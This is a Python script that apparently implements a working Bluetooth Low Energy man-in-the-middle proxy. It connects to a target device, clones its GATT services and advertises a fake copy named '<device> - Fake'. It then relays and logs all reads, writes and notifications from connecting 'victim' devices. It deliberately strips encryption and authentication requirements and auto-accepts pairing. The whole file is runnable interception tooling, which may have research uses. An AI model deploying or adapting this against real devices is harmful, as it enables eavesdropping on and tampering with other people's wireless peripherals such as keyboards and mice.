#!/usr/bin/env python3
"""
ble_mitm.py  –  BLE MITM proxy using Bleak (central) + BlueZ DBus (peripheral)

Usage:
    sudo python3 ble_mitm.py --scan                                         # scan only
    sudo python3 ble_mitm.py --scan --adapter hci3                          # scan on specific adapter
    sudo python3 ble_mitm.py --target FF:56:E4:83:18:1E                     # run proxy
    sudo python3 ble_mitm.py --target FF:56:E4:83:18:1E --central hci3 --peripheral hci4
"""

import asyncio
import argparse
import logging
import signal
import sys
import threading
from dataclasses import dataclass, field
from datetime import datetime

import dbus
import dbus.service
import dbus.mainloop.glib
from gi.repository import GLib
from bleak import BleakClient, BleakScanner

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

BLUEZ_SERVICE      = "org.bluez"
LE_ADV_MANAGER    = "org.bluez.LEAdvertisingManager1"
LE_ADV_IFACE      = "org.bluez.LEAdvertisement1"
GATT_MANAGER_IFACE = "org.bluez.GattManager1"
GATT_SERVICE_IFACE = "org.bluez.GattService1"
GATT_CHAR_IFACE    = "org.bluez.GattCharacteristic1"
DBUS_PROP_IFACE    = "org.freedesktop.DBus.Properties"
AGENT_IFACE        = "org.bluez.Agent1"
AGENT_MANAGER_IFACE = "org.bluez.AgentManager1"
AGENT_PATH         = "/org/bleproxy/agent"
DBUS_OM_IFACE      = "org.freedesktop.DBus.ObjectManager"

char_values: dict[int, bytearray] = {}   # keyed by BLE handle, not UUID
char_write_prefers_response: dict[int, bool] = {}
bleak_client: BleakClient | None = None
asyncio_loop: asyncio.AbstractEventLoop | None = None
log_file = None


# ─── Scanner ──────────────────────────────────────────────────────────────────
async def scan_devices(adapter: str, duration: float = 10.0):
    log.info(f"Scanning on {adapter} for {duration}s ... (Ctrl+C to stop early)\n")
    
    seen = {}  # address -> (name, rssi)

    def on_device(device, adv_data):
        addr = device.address
        name = device.name or adv_data.local_name or "Unknown"
        rssi = adv_data.rssi if adv_data.rssi else "?"
        if addr not in seen or seen[addr][0] == "Unknown":
            seen[addr] = (name, rssi)
            flag = " ← named" if name != "Unknown" else ""
            print(f"  {addr}  RSSI={rssi:>4}  {name}{flag}")

    async with BleakScanner(detection_callback=on_device, bluez={"adapter": adapter}):
        try:
            await asyncio.sleep(duration)
        except asyncio.CancelledError:
            pass

    print(f"\n[+] Scan complete. Found {len(seen)} device(s).")
    if seen:
        named = {a: v for a, v in seen.items() if v[0] != "Unknown"}
        if named:
            print("\n[+] Named devices only:")
            for addr, (name, rssi) in named.items():
                print(f"    {addr}  {name}  (RSSI={rssi})")
    return seen


# ─── Logging helpers ──────────────────────────────────────────────────────────
def log_event(direction: str, uuid: str, data: bytearray):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    line = f"[{ts}] {direction:4s}  UUID={uuid}  DATA={data.hex()}"
    print(line)
    if log_file:
        log_file.write(line + "\n")
        log_file.flush()


def log_connection(event: str, addr: str, extra: str = ""):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    line = f"[{ts}] {event:4s}  ADDR={addr}" + (f"  {extra}" if extra else "")
    log.info(line)
    if log_file:
        log_file.write(line + "\n")
        log_file.flush()


# ─── Victim connection monitor ────────────────────────────────────────────────
def setup_victim_monitoring(bus, peripheral_adapter: str):
    """Watch for devices connecting/disconnecting on the peripheral adapter."""
    adapter_path = f"/org/bluez/{peripheral_adapter}"

    def _addr_from_path(path: str) -> str:
        if "/dev_" not in path:
            return "unknown"
        dev_token = path.split("/dev_", 1)[1].split("/", 1)[0]
        return dev_token.replace("_", ":")

    def on_properties_changed(iface, changed, _invalidated, path=None):
        # Unconditional — log every PropertiesChanged signal so we can see
        # whether BlueZ is emitting anything for the connecting device at all.
        if path and "/dev_" in path:
            log.info(f"[PROP] path={path} iface={iface} changed={list(changed.keys())}")
        if iface != "org.bluez.Device1":
            return
        if not path or not path.startswith(adapter_path):
            return
        try:
            dev_obj = bus.get_object(BLUEZ_SERVICE, path)
            props_iface = dbus.Interface(dev_obj, DBUS_PROP_IFACE)
            addr = str(props_iface.Get("org.bluez.Device1", "Address"))
            try:
                name = str(props_iface.Get("org.bluez.Device1", "Name"))
            except Exception:
                name = "Unknown"
        except Exception:
            addr, name = "unknown", "Unknown"

        if "Connected" in changed:
            if changed["Connected"]:
                log_connection("VCON", addr, f"name={name}")
            else:
                log_connection("VDIS", addr, f"name={name}")

        if "ServicesResolved" in changed:
            resolved = bool(changed["ServicesResolved"])
            log_connection("VSVC", addr, f"ServicesResolved={resolved}")

    bus.add_signal_receiver(
        on_properties_changed,
        dbus_interface=DBUS_PROP_IFACE,
        signal_name="PropertiesChanged",
        path_keyword="path",
    )

    def on_interfaces_added(object_path, interfaces, path=None):
        path = path or object_path
        if not path or not path.startswith(f"{adapter_path}/dev_"):
            return
        device_props = interfaces.get("org.bluez.Device1", {})
        if not device_props:
            return
        addr = str(device_props.get("Address", _addr_from_path(path)))
        name = str(device_props.get("Name", "Unknown"))
        rssi = device_props.get("RSSI")
        extra = f"path={path} name={name}"
        if rssi is not None:
            extra += f" rssi={int(rssi)}"
        log_connection("VSEE", addr, extra)

    def on_interfaces_removed(object_path, interfaces, path=None):
        path = path or object_path
        if not path or not path.startswith(f"{adapter_path}/dev_"):
            return
        if "org.bluez.Device1" not in interfaces:
            return
        log_connection("VREM", _addr_from_path(path), f"path={path}")

    bus.add_signal_receiver(
        on_interfaces_added,
        dbus_interface=DBUS_OM_IFACE,
        signal_name="InterfacesAdded",
        path_keyword="path",
    )
    bus.add_signal_receiver(
        on_interfaces_removed,
        dbus_interface=DBUS_OM_IFACE,
        signal_name="InterfacesRemoved",
        path_keyword="path",
    )


# ─── Pairing agent (NoInputNoOutput / Just Works) ─────────────────────────────
class SimpleAgent(dbus.service.Object):
    """Accepts all pairing requests without user interaction."""

    def __init__(self, bus):
        super().__init__(bus, AGENT_PATH)

    @dbus.service.method(AGENT_IFACE, in_signature="os", out_signature="")
    def AuthorizeService(self, _device, _uuid): pass

    @dbus.service.method(AGENT_IFACE, in_signature="o", out_signature="")
    def RequestAuthorization(self, _device): pass

    @dbus.service.method(AGENT_IFACE, in_signature="", out_signature="")
    def Cancel(self): pass


# ─── DBus Advertisement ───────────────────────────────────────────────────────
class BLEAdvertisement(dbus.service.Object):
    PATH_BASE = "/org/bleproxy/advertisement"

    def __init__(self, bus, index, device_name):
        self.path = f"{self.PATH_BASE}{index}"
        self.ad_type = "peripheral"
        self.local_name = device_name
        super().__init__(bus, self.path)

    def get_properties(self):
        return {
            LE_ADV_IFACE: {
                "Type": self.ad_type,
                "LocalName": dbus.String(self.local_name),
                "Appearance": dbus.UInt16(962),  # 962 = Mouse
                "Includes": dbus.Array(["tx-power"], signature="s"),
            }
        }
    def get_path(self): return dbus.ObjectPath(self.path)

    @dbus.service.method(DBUS_PROP_IFACE, in_signature="ss", out_signature="v")
    def Get(self, iface, name):
        return self.get_properties()[iface][name]

    @dbus.service.method(DBUS_PROP_IFACE, in_signature="s", out_signature="a{sv}")
    def GetAll(self, iface):
        return self.get_properties()[iface]

    @dbus.service.method(LE_ADV_IFACE)
    def Release(self): pass


# ─── GATT Characteristic ──────────────────────────────────────────────────────
class BLECharacteristic(dbus.service.Object):
    def __init__(self, bus, index, uuid, flags, service_path, handle=0):
        self.path = f"{service_path}/char{index}"
        self.uuid = uuid
        self.flags = flags
        self.handle = handle
        self.value = dbus.Array([], signature="y")
        self.notifying = False
        self.descriptors: list[BLEDescriptor] = []
        super().__init__(bus, self.path)

    def add_descriptor(self, desc):
        self.descriptors.append(desc)

    def get_properties(self):
        return {
            GATT_CHAR_IFACE: {
                "Service": dbus.ObjectPath(self.path.rsplit("/", 1)[0]),
                "UUID": self.uuid,
                "Flags": dbus.Array(self.flags, signature="s"),
                "Value": self.value,
                "Notifying": dbus.Boolean(self.notifying),
                "Descriptors": dbus.Array([d.get_path() for d in self.descriptors], signature="o"),
            }
        }

    def get_path(self): return dbus.ObjectPath(self.path)

    @dbus.service.method(DBUS_PROP_IFACE, in_signature="s", out_signature="a{sv}")
    def GetAll(self, iface):
        log.info(f"[GATT] GetAll char uuid={self.uuid} flags={self.flags}")
        return self.get_properties()[iface]

    @dbus.service.method(GATT_CHAR_IFACE, in_signature="a{sv}", out_signature="ay")
    def ReadValue(self, options):
        log.debug(f"[GATT-READ] char path={self.path} handle={self.handle} uuid={self.uuid} options={dict(options)}")
        val = char_values.get(self.handle, bytearray())
        log_event("READ", self.uuid, val)
        return dbus.Array(val, signature="y")

    @dbus.service.method(GATT_CHAR_IFACE, in_signature="aya{sv}")
    def WriteValue(self, value, options):
        log.debug(f"[GATT-WRIT] char path={self.path} handle={self.handle} uuid={self.uuid} options={dict(options)}")
        data = bytearray(value)
        log_event("WRIT", self.uuid, data)

        opt_type = str(options.get("type", "")) if options else ""
        mode_from_victim = "request" if opt_type == "request" else "command" if opt_type == "command" else "unknown"

        if opt_type == "request":
            response = True
        elif opt_type == "command":
            response = False
        else:
            # Fallback when BlueZ does not provide write "type" in options.
            response = char_write_prefers_response.get(self.handle, False)

        log.info(
            f"[WRIT-DBG] handle={self.handle} uuid={self.uuid} "
            f"victim_mode={mode_from_victim} forward_response={response} options={dict(options)}"
        )

        if bleak_client and bleak_client.is_connected and asyncio_loop:
            log_event("FWRD", self.uuid, data)
            # Use handle to disambiguate when multiple chars share a UUID (e.g. HID Report)
            target = self.handle if self.handle else self.uuid
            future = asyncio.run_coroutine_threadsafe(
                bleak_client.write_gatt_char(target, data, response=response),
                asyncio_loop,
            )

            def _on_done(fut):
                try:
                    fut.result()
                    log.info(f"[FWRD-OK] handle={self.handle} uuid={self.uuid} response={response}")
                except Exception as e:
                    log.warning(f"[FWRD-ERR] handle={self.handle} uuid={self.uuid} response={response} error={e}")

            future.add_done_callback(_on_done)
        else:
            log.warning(
                f"[FWRD-SKIP] handle={self.handle} uuid={self.uuid} "
                f"client_connected={bool(bleak_client and bleak_client.is_connected)} loop_ready={bool(asyncio_loop)}"
            )

    @dbus.service.signal(DBUS_PROP_IFACE, signature="sa{sv}as")
    def PropertiesChanged(self, iface, changed, invalidated): pass

    @dbus.service.method(GATT_CHAR_IFACE)
    def StartNotify(self):
        log.debug(f"[GATT-NOTI] char path={self.path} handle={self.handle} uuid={self.uuid} start_notify")
        if self.notifying:
            return
        self.notifying = True
        self.PropertiesChanged(GATT_CHAR_IFACE, {"Notifying": dbus.Boolean(True)}, [])

    @dbus.service.method(GATT_CHAR_IFACE)
    def StopNotify(self):
        log.debug(f"[GATT-NOTI] char path={self.path} handle={self.handle} uuid={self.uuid} stop_notify")
        if not self.notifying:
            return
        self.notifying = False
        self.PropertiesChanged(GATT_CHAR_IFACE, {"Notifying": dbus.Boolean(False)}, [])

    def notify(self, data: bytearray):
        self.value = dbus.Array(data, signature="y")
        self.PropertiesChanged(GATT_CHAR_IFACE, {"Value": self.value}, [])


class BLEDescriptor(dbus.service.Object):
    def __init__(self, bus, index, uuid, flags, char_path):
        self.path = f"{char_path}/desc{index}"
        self.uuid = uuid
        self.flags = flags
        self.value = dbus.Array([], signature="y")
        super().__init__(bus, self.path)

    def get_path(self):
        return dbus.ObjectPath(self.path)

    def get_properties(self):
        return {
            "org.bluez.GattDescriptor1": {
                "Characteristic": dbus.ObjectPath(self.path.rsplit("/", 1)[0]),
                "UUID": dbus.String(self.uuid),
                "Flags": dbus.Array(self.flags, signature="s"),
                "Value": self.value,
            }
        }

    @dbus.service.method(DBUS_PROP_IFACE, in_signature="s", out_signature="a{sv}")
    def GetAll(self, iface):
        log.debug(f"[GATT-GETALL] desc path={self.path} iface={iface}")
        return self.get_properties()[iface]

    @dbus.service.method("org.bluez.GattDescriptor1", in_signature="a{sv}", out_signature="ay")
    def ReadValue(self, options):
        log.debug(f"[GATT-READ] desc path={self.path} uuid={self.uuid} options={dict(options)}")
        return self.value

    @dbus.service.method("org.bluez.GattDescriptor1", in_signature="aya{sv}")
    def WriteValue(self, value, options):
        log.debug(f"[GATT-WRIT] desc path={self.path} uuid={self.uuid} options={dict(options)}")
        self.value = dbus.Array(value, signature="y")


# ─── GATT Service ─────────────────────────────────────────────────────────────
class BLEService(dbus.service.Object):
    PATH_BASE = "/org/bleproxy/service"

    def __init__(self, bus, index, uuid, primary=True):
        self.path = f"{self.PATH_BASE}{index}"
        self.uuid = uuid
        self.primary = primary
        self.characteristics: list[BLECharacteristic] = []
        super().__init__(bus, self.path)

    def get_path(self): return dbus.ObjectPath(self.path)
    def add_characteristic(self, char): self.characteristics.append(char)

    def get_properties(self):
        return {
            GATT_SERVICE_IFACE: {
                "UUID": dbus.String(self.uuid),
                "Primary": dbus.Boolean(self.primary),
                "Includes": dbus.Array([], signature="o"),
                "Characteristics": dbus.Array(
                    [char.get_path() for char in self.characteristics],
                    signature="o",
                ),
            }
        }

    @dbus.service.method(DBUS_PROP_IFACE, in_signature="s", out_signature="a{sv}")
    def GetAll(self, iface):
        log.info(f"[GATT] GetAll svc uuid={self.uuid}")
        return self.get_properties()[iface]


# ─── Object Manager ───────────────────────────────────────────────────────────
class BLEApplication(dbus.service.Object):
    def __init__(self, bus):
        self.path = "/org/bleproxy"
        self.services: list[BLEService] = []
        super().__init__(bus, self.path)

    def add_service(self, svc): self.services.append(svc)

    @dbus.service.method(DBUS_OM_IFACE, out_signature="a{oa{sa{sv}}}")
    def GetManagedObjects(self):
        response = {}
        for svc in self.services:
            response[svc.get_path()] = svc.get_properties()
            for char in svc.characteristics:
                response[char.get_path()] = char.get_properties()
                for desc in char.descriptors:
                    response[desc.get_path()] = desc.get_properties()
        log.info(f"[GATT] GetManagedObjects called — returning {len(self.services)} service(s): {[str(k) for k in response.keys()]}")
        return response


# ─── Enumeration result types ─────────────────────────────────────────────────
@dataclass
class CharInfo:
    uuid: str
    flags: list[str]
    handle: int = 0
    initial_value: bytearray = field(default_factory=bytearray)
    descriptors: list[tuple[str, list[str]]] = field(default_factory=list)


@dataclass
class ServiceInfo:
    uuid: str
    chars: list[CharInfo] = field(default_factory=list)


@dataclass
class EnumResult:
    device_name: str
    service_uuids: list[str]
    services: list[ServiceInfo]


# ─── Enumerate on an already-open connection ──────────────────────────────────
async def _enumerate_connected(client) -> EnumResult:
    """Collect service/characteristic metadata from an open client (no reads)."""
    services: list[ServiceInfo] = []
    service_uuids: list[str] = []

    for svc in client.services:
        svc_info = ServiceInfo(uuid=str(svc.uuid))
        service_uuids.append(str(svc.uuid))
        for char in svc.characteristics:
            uuid = str(char.uuid)
            # Strip security-enforcement flags: the real device may require
            # encryption/auth on its characteristics, but the proxy should allow
            # the client VM to connect and read without pairing.  BlueZ will
            # refuse connection/discovery if these flags are present and the
            # connecting client hasn't paired.
            _SECURITY_FLAGS = {
                "encrypt-read", "encrypt-write",
                "encrypt-authenticated-read", "encrypt-authenticated-write",
                "secure-read", "secure-write",
                "authorize",
            }
            flags = [f for f in char.properties if f not in _SECURITY_FLAGS]
            descs: list[tuple[str, list[str]]] = []
            for desc in char.descriptors:
                # BlueZ manages CCCD (2902) and SCCD (2903) internally for
                # notify/indicate characteristics — registering them in the app
                # causes BlueZ to silently break ATT service discovery.
                desc_uuid = str(desc.uuid)
                if desc_uuid in (
                    "00002902-0000-1000-8000-00805f9b34fb",  # CCCD
                    "00002903-0000-1000-8000-00805f9b34fb",  # SCCD
                ):
                    continue
                # Bleak does not expose descriptor flags on all backends.
                # Keep descriptor readable/writable for discovery compatibility.
                descs.append((desc_uuid, ["read", "write"]))
            svc_info.chars.append(CharInfo(uuid=uuid, flags=flags, handle=char.handle, descriptors=descs))
        services.append(svc_info)

    log.info(f"Enumerated {len(services)} service(s).")
    return EnumResult(
        device_name=client.address,  # overwritten by caller with device.name
        service_uuids=service_uuids,
        services=services,
    )


# ─── Proxy ────────────────────────────────────────────────────────────────────
async def run_proxy(target_mac: str, central_adapter: str, peripheral_adapter: str):
    global bleak_client, asyncio_loop, log_file

    log_file = open(f"logs/mitm_{target_mac.replace(':', '')}.log", "w")
    asyncio_loop = asyncio.get_event_loop()

    log.info("Put the device in pairing mode (long-press the channel button), then press Enter...")
    await asyncio.get_event_loop().run_in_executor(None, input)

    proc = await asyncio.create_subprocess_exec(
        "bluetoothctl", "remove", target_mac,
        stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
    )
    await proc.wait()

    log.info(f"Scanning for {target_mac} on {central_adapter}...")
    device = await BleakScanner.find_device_by_address(target_mac, timeout=15.0, bluez={"adapter": central_adapter})
    if not device:
        log.error("Target not found. Is it advertising?")
        return
    log.info(f"Found: {device.name} [{device.address}]")

    # Set up GLib/DBus and pairing agent BEFORE connecting so they're ready
    # when pair=True triggers the Just Works handshake during BleakClient.connect()
    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
    bus = dbus.SystemBus()

    stop_event = asyncio.Event()
    glib_loop = GLib.MainLoop()
    GLib.unix_signal_add(GLib.PRIORITY_HIGH, signal.SIGINT,
                         lambda: (glib_loop.quit(), asyncio_loop.call_soon_threadsafe(stop_event.set)))
    glib_thread = threading.Thread(target=glib_loop.run, daemon=True)
    glib_thread.start()

    SimpleAgent(bus)
    agent_manager = dbus.Interface(bus.get_object(BLUEZ_SERVICE, "/org/bluez"), AGENT_MANAGER_IFACE)
    agent_manager.RegisterAgent(AGENT_PATH, "NoInputNoOutput")
    agent_manager.RequestDefaultAgent(AGENT_PATH)
    log.info("Pairing agent registered.")

    def on_disconnect(_):
        log.warning("Disconnected from real device!")
        asyncio_loop.call_soon_threadsafe(stop_event.set)

    async with BleakClient(device, bluez={"adapter": central_adapter}, timeout=30.0, disconnected_callback=on_disconnect, pair=True) as client:
        bleak_client = client
        log.info("Connected. Enumerating services...")

        # Enumerate while connected — collect service structure and seed values
        enum = await _enumerate_connected(client)
        base_name = device.name or "BLE Device"
        enum.device_name = f"{base_name} - Fake"

        # Build GLib peripheral objects (no BLE traffic, fast)
        adapter_path = f"/org/bluez/{peripheral_adapter}"
        adapter_obj  = bus.get_object(BLUEZ_SERVICE, adapter_path)

        om = dbus.Interface(bus.get_object(BLUEZ_SERVICE, "/"), DBUS_OM_IFACE)
        managed = om.GetManagedObjects()
        adapter_ifaces = managed.get(adapter_path, {})
        if GATT_MANAGER_IFACE not in adapter_ifaces:
            log.error(f"Adapter {peripheral_adapter} is missing {GATT_MANAGER_IFACE}")
            return
        if LE_ADV_MANAGER not in adapter_ifaces:
            log.error(f"Adapter {peripheral_adapter} is missing {LE_ADV_MANAGER}")
            return

        adv_manager  = dbus.Interface(adapter_obj, LE_ADV_MANAGER)
        gatt_manager = dbus.Interface(adapter_obj, GATT_MANAGER_IFACE)

        app = BLEApplication(bus)
        
        adv = BLEAdvertisement(bus, 0, enum.device_name)

        # BlueZ 5.72+ refuses to register Generic Access (0x1800) and Generic
        # Attribute (0x1801) via external applications — it owns those internally.
        BLUEZ_RESERVED = {
            "00001800-0000-1000-8000-00805f9b34fb",  # Generic Access
            "00001801-0000-1000-8000-00805f9b34fb",  # Generic Attribute
        }

        char_objects: dict[int, BLECharacteristic] = {}   # handle → dbus char
        svc_dbus_idx = 0
        for svc_info in enum.services:
            if svc_info.uuid in BLUEZ_RESERVED:
                log.debug(f"Skipping BlueZ-reserved service {svc_info.uuid}")
                continue
            dbus_svc = BLEService(bus, svc_dbus_idx, svc_info.uuid)
            svc_dbus_idx += 1
            for char_idx, char_info in enumerate(svc_info.chars):
                dbus_char = BLECharacteristic(bus, char_idx, char_info.uuid, char_info.flags, dbus_svc.path, handle=char_info.handle)
                char_values[char_info.handle] = char_info.initial_value
                can_write_req = "write" in char_info.flags
                can_write_cmd = "write-without-response" in char_info.flags
                # Prefer request/response only when command mode is unavailable.
                char_write_prefers_response[char_info.handle] = can_write_req and not can_write_cmd
                for desc_idx, (desc_uuid, desc_flags) in enumerate(char_info.descriptors):
                    dbus_desc = BLEDescriptor(bus, desc_idx, desc_uuid, desc_flags, dbus_char.path)
                    dbus_char.add_descriptor(dbus_desc)
                char_objects[char_info.handle] = dbus_char
                dbus_svc.add_characteristic(dbus_char)
            app.add_service(dbus_svc)

        gatt_opts = dbus.Dictionary({}, signature="sv")
        adv_opts = dbus.Dictionary({}, signature="sv")

        def _on_adv_ok():
            log.info(f"Advertising as '{enum.device_name}' on {peripheral_adapter} — ready!")

        def _on_adv_err(e):
            log.error(f"Advertising error: {e}")

        def _on_gatt_ok():
            log.info("GATT app registered")
            adv_manager.RegisterAdvertisement(
                adv.get_path(),
                adv_opts,
                reply_handler=_on_adv_ok,
                error_handler=_on_adv_err,
            )

        def _on_gatt_err(e):
            log.error(f"GATT error: {e}")

        # Spawn btmon to capture raw HCI/ATT events on the peripheral adapter.
        # Output goes to logs/btmon_<adapter>.log for post-mortem inspection.
        btmon_log_path = f"logs/btmon_{peripheral_adapter}.log"
        btmon_proc = None
        try:
            btmon_log_fh = open(btmon_log_path, "w")
            btmon_proc = await asyncio.create_subprocess_exec(
                "btmon", "-i", peripheral_adapter,
                stdout=btmon_log_fh, stderr=btmon_log_fh,
            )
            log.info(f"btmon started — raw HCI log: {btmon_log_path}")
        except Exception as e:
            log.warning(f"Could not start btmon: {e}")

        gatt_manager.RegisterApplication(
            app.path,
            gatt_opts,
            reply_handler=_on_gatt_ok,
            error_handler=_on_gatt_err,
        )
        setup_victim_monitoring(bus, peripheral_adapter)

        log.info("Subscribing to notifications...")
        for svc in client.services:
            for char in svc.characteristics:
                if not {"notify", "indicate"}.intersection(char.properties):
                    continue
                handle = char.handle
                if handle not in char_objects:
                    continue
                dbus_char = char_objects[handle]
                def make_handler(h=handle, u=str(char.uuid), dc=dbus_char):
                    def handler(_, data: bytearray):
                        char_values[h] = data
                        log_event("NOTF", u, data)
                        dc.notify(data)
                    return handler
                try:
                    await client.start_notify(char, make_handler())
                except Exception as e:
                    log.warning(f"Could not subscribe to {char.uuid} (handle {handle}): {e}")

        await stop_event.wait()
        glib_loop.quit()
        glib_thread.join(timeout=2)

        if btmon_proc is not None and btmon_proc.returncode is None:
            btmon_proc.terminate()
            try:
                await asyncio.wait_for(btmon_proc.wait(), timeout=2)
            except asyncio.TimeoutError:
                btmon_proc.kill()

    log_file.close()


# ─── Entry point ──────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="BLE MITM proxy with scanner")
    parser.add_argument("--scan",        action="store_true", help="Scan for nearby BLE devices")
    parser.add_argument("--duration",    type=float, default=10.0, help="Scan duration in seconds (default: 10)")
    parser.add_argument("--adapter",     default="hci0", help="Adapter for scanning (default: hci0)")
    parser.add_argument("--target",      help="Target device MAC for proxy mode")
    parser.add_argument("--central",     default="hci3", help="Adapter to connect to target (default: hci3)")
    parser.add_argument("--peripheral",  default="hci4", help="Adapter to advertise on (default: hci4)")
    args = parser.parse_args()

    try:
        if args.scan:
            asyncio.run(scan_devices(args.adapter, args.duration))
        elif args.target:
            asyncio.run(run_proxy(args.target, args.central, args.peripheral))
        else:
            parser.print_help()
    except KeyboardInterrupt:
        log.info("Interrupted, exiting.")


if __name__ == "__main__":
    main()
